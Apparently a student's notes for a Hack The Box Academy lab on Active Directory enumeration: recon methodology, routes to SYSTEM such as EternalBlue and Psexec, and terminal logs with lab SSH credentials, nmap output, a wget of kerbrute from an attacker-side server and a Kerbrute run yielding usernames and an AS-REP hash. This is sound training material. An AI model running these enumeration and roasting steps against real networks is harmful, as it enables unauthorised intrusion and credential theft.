# Initial Domain Enumeration

## Goal at This Stage

Get from **anonymous → domain user credentials or SYSTEM access** on a domain-joined host.

---

## Methodology

```
Passive listening (Wireshark/Responder) → ICMP sweep (fping) → Nmap scan → Kerbruteuser enum → Find foothold
```

---

## Key Data Points to Collect

| Data Point | What to Note |
| --- | --- |
| AD Users | Valid usernames for password spraying |
| Domain Controllers | IP, hostname, FQDN |
| Key services | DNS(53), Kerberos(88), LDAP(389/636), SMB(445) |
| File/SQL/Web servers | High-value targets |
| Legacy OS hosts | Potential EternalBlue, MS08-067 targets |

---

## Phase 1: Passive Listening

### Wireshark

```bash
sudo -E wireshark
```

- Capture ARP → reveals live host IPs
- Capture MDNS → reveals hostnames
- Save as .pcap for later review

### tcpdump (no GUI)

```bash
sudo tcpdump -i ens224
sudo tcpdump -i ens224 -w capture.pcap   # save for later
```

### Responder (Analyze Mode — passive only)

```bash
sudo responder -I ens224 -A
```

> `-A` = analyze mode only, **no poisoning** — safe for passive recon
> 
> 
> Reveals: LLMNR, NBT-NS, MDNS traffic → hostnames + IPs not seen in ARP
> 

---

## Phase 2: Active Host Discovery

### fping (ICMP sweep)

```bash
fping -asgq 172.16.5.0/23
```

| Flag | Meaning |
| --- | --- |
| `-a` | Show only alive hosts |
| `-s` | Print stats at end |
| `-g` | Generate target list from CIDR |
| `-q` | Quiet (no per-target output) |

---

## Phase 3: Nmap Enumeration

```bash
# Aggressive scan against discovered hosts
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum

# Always save output in all formats
sudo nmap -v -A -iL hosts.txt -oA host-enum-results
```

### What to Look For in Nmap Output

**Domain Controller indicators:**

- Port 53 (DNS), 88 (Kerberos), 389/636 (LDAP), 445 (SMB), 3268/3269 (Global Catalog)
- SSL cert Subject Alternative Name reveals DC hostname: `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
- RDP NTLM info reveals: domain name, NetBIOS name, computer name, Windows version

**Legacy hosts (high value):**

- Windows Server 2008 R2 → EternalBlue potential
- IIS 7.5 → older, likely unpatched
- SQL Server 2008 R2 → old, potential exploits

---

## Phase 4: Username Enumeration — Kerbrute

Kerbrute uses Kerberos pre-auth failures → **stealthier than traditional user enum** (fewer logs/alerts)

### Setup

```bash
# Clone and compile
sudo git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
sudo make all
ls dist/   # compiled binaries

# Add to PATH
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### Run Username Enumeration

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

| Flag | Meaning |
| --- | --- |
| `userenum` | Username enumeration mode |
| `-d` | Target domain |
| `--dc` | Domain Controller IP |
| `-o` | Output file |

**Wordlists:** Use `jsmith.txt` or `jsmith2.txt` from [Insidetrust repo](https://github.com/insidetrust/statistically-likely-usernames)

---

## Getting SYSTEM Access (Path to Domain Enum)

`NT AUTHORITY\SYSTEM` on a domain-joined host ≈ domain user account — can enumerate AD

**Ways to get SYSTEM:**

- MS08-067, EternalBlue, BlueKeep (legacy hosts)
- Abuse service with SeImpersonatePrivilege (Juicy Potato — older OS)
- Local privesc (Windows 10 Task Scheduler 0-day)
- Local admin → Psexec → SYSTEM shell

**What SYSTEM gives you:**

- BloodHound / PowerView enumeration
- Kerberoasting / ASREPRoasting
- Inveigh (capture Net-NTLMv2 hashes)
- Token impersonation → hijack privileged user
- ACL attacks

---

## DC Identification from Nmap Output

```
Port 88 (Kerberos) + Port 389 (LDAP) + SSL cert showing domain name = Domain Controller
```

Example from scan: `172.16.5.5` = `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`

---

## Important Notes

- Always save output with `oA` (all formats) when using Nmap
- Some Nmap scripts are **destructive** — can crash legacy/industrial systems
- Legacy hosts: **get client approval in writing** before exploiting
- Non-evasive test → noise is OK; evasive/red team → stealth matters
- Always document findings immediately — don't rely on memory

---

## Hosts Discovered (Example Lab)

| IP | Host | Notable |
| --- | --- | --- |
| 172.16.5.5 | ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL | **Domain Controller** |
| 172.16.5.100 | ACADEMY-EA-CTX1 | Win Server 2008 R2 + SQL 2008 R2 — **legacy** |
| Others | Various | Web servers, workstations |

## Assessment

1. SSH to 10.129.47.38 (ACADEMY-EA-ATTACK01), with user "htb-student" and password "HTB_@cademy_stdnt!" 

```jsx
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $ip a                                                                                                                                                                 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:7b:3e brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 10.129.47.38/16 brd 10.129.255.255 scope global dynamic noprefixroute ens192
       valid_lft 1971sec preferred_lft 1971sec
    inet6 dead:beef::18d9:abc5:f73f:6be0/64 scope global dynamic noprefixroute 
       valid_lft 86401sec preferred_lft 14401sec
    inet6 fe80::1405:18f:3db7:1f57/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:de:6c brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.16.5.225/23 brd 172.16.5.255 scope global noprefixroute ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::32e6:baa0:e3aa:25da/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:da:39:d4:8d brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
       
       
┌─[htb-student@ea-attack01]─[~]
└──╼ $fping -asgq 172.16.5.0/23
172.16.5.5
172.16.5.130
172.16.5.225

     510 targets
       3 alive
     507 unreachable
       0 unknown addresses

    2028 timeouts (waiting for response)
    2031 ICMP Echos sent
       3 ICMP Echo Replies received
    2028 other ICMP received

 0.035 ms (min round trip time)
 0.419 ms (avg round trip time)
 0.871 ms (max round trip time)
       15.067 sec (elapsed real time)

```

1. Nmap Scan

```jsx
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
Starting Nmap 7.92 ( https://nmap.org ) at 2026-09-28 06:08 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:08
Completed NSE at 06:08, 0.00s elapsed
Initiating NSE at 06:08
Completed NSE at 06:08, 0.00s elapsed
Initiating NSE at 06:08
Completed NSE at 06:08, 0.00s elapsed
Initiating ARP Ping Scan at 06:08
Scanning 2 hosts [1 port/host]
Completed ARP Ping Scan at 06:08, 0.04s elapsed (2 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:08
Completed Parallel DNS resolution of 1 host. at 06:08, 13.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:08
Completed Parallel DNS resolution of 1 host. at 06:08, 13.00s elapsed
Initiating SYN Stealth Scan at 06:08
Scanning 2 hosts [1000 ports/host]
Completed SYN Stealth Scan against 172.16.5.5 in 1.59s (1 host left)
Completed SYN Stealth Scan at 06:08, 1.59s elapsed (2000 total ports)
Initiating Service scan at 06:08
Scanning 20 services on 2 hosts
Completed Service scan at 06:09, 44.56s elapsed (20 services on 2 hosts)
Initiating OS detection (try #1) against 2 hosts
NSE: Script scanning 2 hosts.
Initiating NSE at 06:09
Completed NSE at 06:10, 64.41s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 7.07s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Nmap scan report for inlanefreight.local (172.16.5.5)
Host is up (0.0011s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-28 10:08:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-28T10:10:43+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Issuer: commonName=INLANEFREIGHT-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-22T08:52:23
| Not valid after:  2027-07-22T08:52:23
| MD5:   0cc8 4f84 6ee6 18a5 61fc ff5f 1648 c4de
|_SHA-1: bd4d 7d5f caa9 2c30 e80c dd04 3ee6 f607 fc80 bd11
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Issuer: commonName=INLANEFREIGHT-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-22T08:52:23
| Not valid after:  2027-07-22T08:52:23
| MD5:   0cc8 4f84 6ee6 18a5 61fc ff5f 1648 c4de
|_SHA-1: bd4d 7d5f caa9 2c30 e80c dd04 3ee6 f607 fc80 bd11
|_ssl-date: 2026-09-28T10:10:43+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-28T10:10:43+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Issuer: commonName=INLANEFREIGHT-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-22T08:52:23
| Not valid after:  2027-07-22T08:52:23
| MD5:   0cc8 4f84 6ee6 18a5 61fc ff5f 1648 c4de
|_SHA-1: bd4d 7d5f caa9 2c30 e80c dd04 3ee6 f607 fc80 bd11
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Issuer: commonName=INLANEFREIGHT-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-22T08:52:23
| Not valid after:  2027-07-22T08:52:23
| MD5:   0cc8 4f84 6ee6 18a5 61fc ff5f 1648 c4de
|_SHA-1: bd4d 7d5f caa9 2c30 e80c dd04 3ee6 f607 fc80 bd11
|_ssl-date: 2026-09-28T10:10:43+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Issuer: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-21T08:46:17
| Not valid after:  2027-01-20T08:46:17
| MD5:   c71e 5856 1bb1 44cb ee0f 4105 f992 f872
|_SHA-1: 54bd 3574 7e9c 194a 574b a613 dbcf 2971 8a61 be07
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-28T10:09:39+00:00
|_ssl-date: 2026-09-28T10:10:43+00:00; 0s from scanner time.
MAC Address: 00:50:56:8A:51:E9 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/28%OT=53%CT=1%CU=33003%PV=Y%DS=1%DC=D%G=Y%M=005056%T
OS:M=6ABA3D2A%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=FE%TI=I%CI=I%II=I%S
OS:S=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5B
OS:4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)E
OS:CN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O
OS:%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=252 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-28T10:09:39
|_  start_date: N/A
| nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:51:e9 (VMware)
| Names:
|   ACADEMY-EA-DC01<00>  Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|   INLANEFREIGHT<1c>    Flags: <group><active>
|   ACADEMY-EA-DC01<20>  Flags: <unique><active>
|_  INLANEFREIGHT<1b>    Flags: <unique><active>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   1.13 ms inlanefreight.local (172.16.5.5)

Nmap scan report for 172.16.5.130
Host is up (0.0016s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-28T09:35:22
| Not valid after:  2056-09-28T09:35:22
| MD5:   45d8 564b 5fff abfe 6af7 b12e a736 08cb
|_SHA-1: 0d4b 66e0 2695 6d47 4f8d f79b 341f 6135 c971 bd50
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-FILE
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
|_ssl-date: 2026-09-28T10:10:43+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
| Issuer: commonName=ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-21T08:47:09
| Not valid after:  2027-01-20T08:47:09
| MD5:   4afa c4df 851d 1ac9 ade4 7b61 5bbf fef4
|_SHA-1: a2fc 24f3 c133 d9bc 43f8 124d 3fdf 670b 49b6 5340
|_ssl-date: 2026-09-28T10:10:43+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-FILE
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-28T10:09:40+00:00
16001/tcp open  mc-nmf        .NET Message Framing
MAC Address: 00:50:56:8A:2A:A3 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/28%OT=80%CT=1%CU=35069%PV=Y%DS=1%DC=D%G=Y%M=005056%T
OS:M=6ABA3D2A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M
OS:5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70
OS:)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
OS:=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   172.16.5.130:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-28T10:09:39
|_  start_date: N/A
| nbstat: NetBIOS name: ACADEMY-EA-FILE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:2a:a3 (VMware)
| Names:
|   ACADEMY-EA-FILE<00>  Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|_  ACADEMY-EA-FILE<20>  Flags: <unique><active>

TRACEROUTE
HOP RTT     ADDRESS
1   1.64 ms 172.16.5.130

Initiating SYN Stealth Scan at 06:10
Scanning 172.16.5.225 [1000 ports]
Discovered open port 22/tcp on 172.16.5.225
Discovered open port 3389/tcp on 172.16.5.225
Completed SYN Stealth Scan at 06:10, 1.05s elapsed (1000 total ports)
Initiating Service scan at 06:10
Scanning 2 services on 172.16.5.225
Completed Service scan at 06:11, 11.03s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 172.16.5.225
NSE: Script scanning 172.16.5.225.
Initiating NSE at 06:11
Completed NSE at 06:11, 0.18s elapsed
Initiating NSE at 06:11
Completed NSE at 06:11, 0.17s elapsed
Initiating NSE at 06:11
Completed NSE at 06:11, 0.00s elapsed
Nmap scan report for 172.16.5.225
Host is up (0.0033s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
3389/tcp open  ms-wbt-server xrdp
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.2
Uptime guess: 32.904 days (since Wed Aug 26 08:29:57 2026)
Network Distance: 0 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 06:11
Completed NSE at 06:11, 0.00s elapsed
Initiating NSE at 06:11
Completed NSE at 06:11, 0.00s elapsed
Initiating NSE at 06:11
Completed NSE at 06:11, 0.00s elapsed
Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.5.5 (inlanefreight.local)
|_    172.16.5.130
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 170.19 seconds
           Raw packets sent: 3274 (153.414KB) | Rcvd: 4176 (178.784KB)

```

1. Kerberosting / Asreproasting 

```jsx
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $wget http://10.10.17.199:8000/kerbrute
--2026-09-28 06:21:12--  http://10.10.17.199:8000/kerbrute                                                                                                                 
Connecting to 10.10.17.199:8000... connected.                                                                                                                              
HTTP request sent, awaiting response... 200 OK
Length: 9216673 (8.8M) [application/octet-stream]
Saving to: ‘kerbrute’

kerbrute                                   100%[=======================================================================================>]   8.79M  1.48MB/s    in 12s     

2026-09-28 06:21:25 (771 KB/s) - ‘kerbrute’ saved [9216673/9216673]

┌─[htb-student@ea-attack01]─[~]
└──╼ $wget http://10.10.17.199:8000/jsmith
--2026-09-28 06:21:52--  http://10.10.17.199:8000/jsmith
Connecting to 10.10.17.199:8000... connected.
HTTP request sent, awaiting response... 404 File not found
2026-09-28 06:21:52 ERROR 404: File not found.

┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $wget http://10.10.17.199:8000/jsmith.txt                                                                                                                             
--2026-09-28 06:22:18--  http://10.10.17.199:8000/jsmith.txt
Connecting to 10.10.17.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 387861 (379K) [text/plain]
Saving to: ‘jsmith.txt’

jsmith.txt                                 100%[=======================================================================================>] 378.77K  74.7KB/s    in 6.6s    

2026-09-28 06:22:25 (57.2 KB/s) - ‘jsmith.txt’ saved [387861/387861]

┌─[htb-student@ea-attack01]─[~]
└──╼ $wget http://10.10.17.199:8000/jsmith2.txt
--2026-09-28 06:22:34--  http://10.10.17.199:8000/jsmith2.txt
Connecting to 10.10.17.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 44005 (43K) [text/plain]
Saving to: ‘jsmith2.txt’

jsmith2.txt                                100%[=======================================================================================>]  42.97K  80.5KB/s    in 0.5s    

2026-09-28 06:22:36 (80.5 KB/s) - ‘jsmith2.txt’ saved [44005/44005]

┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/28/26 - Ronnie Flathers @ropnop

2026/09/28 06:23:02 >  Using KDC(s):
2026/09/28 06:23:02 >   172.16.5.5:88

2026/09/28 06:23:02 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       jwilson@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       bdavis@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       njohnson@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       asanchez@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       dlewis@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       ccruz@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       rramirez@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f5daa7d9cf45778f5bf146943ee807b5$e56845af748bafdb17759ca027daa1490592fffa861f4026f8056b25cd92b373cfee679e71fcfb621cab238bf8e1a25d0bdba0715ca166e14cdcf43f45dcc11069384b2e49b1b7a4db557bb822240401596095d600bac39641aaabcb2d9daedfda094be2731e5e937832d7e94685f407c1a859e39a031e75f298f55162483fb83fc27d966e330b89282cf73f23998122b8bf694f836016ff793790e0128fe036b8b40c4bbddde002e984e0c932f0423fdfc5950d247a60f25722e303632825ad61ac0766390092b3a0bcfa756b15ca1f8facbf40a5ff04164c781b795530e42f8a8579ea422a8815e4b3f41cf5c2e331063f0bf53bbcffd5051ee670c1b0e2cb215f6b44190335ee9140                                                                             
2026/09/28 06:23:02 >  [+] VALID USERNAME:       mmorgan@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       jwallace@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       jsantiago@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       gdavis@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       mrichardson@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       mharrison@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       tgarcia@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       jmay@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       jmontgomery@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       jhopkins@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       dpayne@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       mhicks@INLANEFREIGHT.LOCAL
2026/09/28 06:23:02 >  [+] VALID USERNAME:       adunn@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       lmatthews@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       avazquez@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       mlowe@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       jmcdaniel@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       csteele@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       mmullins@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       mochoa@INLANEFREIGHT.LOCAL
2026/09/28 06:23:03 >  [+] VALID USERNAME:       aslater@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       ehoffman@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       ehamilton@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       cpennington@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       srosario@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       lbradford@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       halvarez@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       gmccarthy@INLANEFREIGHT.LOCAL
2026/09/28 06:23:04 >  [+] VALID USERNAME:       dbranch@INLANEFREIGHT.LOCAL
